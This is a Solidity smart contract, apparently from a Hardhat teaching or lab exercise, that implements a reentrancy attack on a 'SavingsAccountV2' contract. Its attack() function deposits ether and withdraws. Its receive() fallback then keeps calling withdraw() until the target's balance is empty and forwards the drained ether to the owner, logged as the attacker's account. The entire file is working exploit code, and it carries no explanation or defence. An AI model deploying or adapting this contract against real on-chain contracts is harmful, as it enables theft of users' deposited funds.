// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface ISavingsAccountV2 {
    function deposite() external payable ;
        
    
     function withdraw() external;
}

contract InvestorV2 is Ownable {
    ISavingsAccountV2 public immutable savingsAccountV2;

    constructor(address savingAccountV2Address) {
        savingsAccountV2 = ISavingsAccountV2(savingAccountV2Address);
        
    }
    function attack() external payable onlyOwner {
        savingsAccountV2.deposite{value : msg.value}(); 
        savingsAccountV2.withdraw(); 
    }
   
   receive() external payable {
    if (address(savingsAccountV2).balance >0) {
         console.log("");
         console.log("Reentering........");
        savingsAccountV2.withdraw();
        
    }
    else {       
        payable(owner()).transfer(address(this).balance);
        console.log("directly to account of the attacker");
    }
   }
}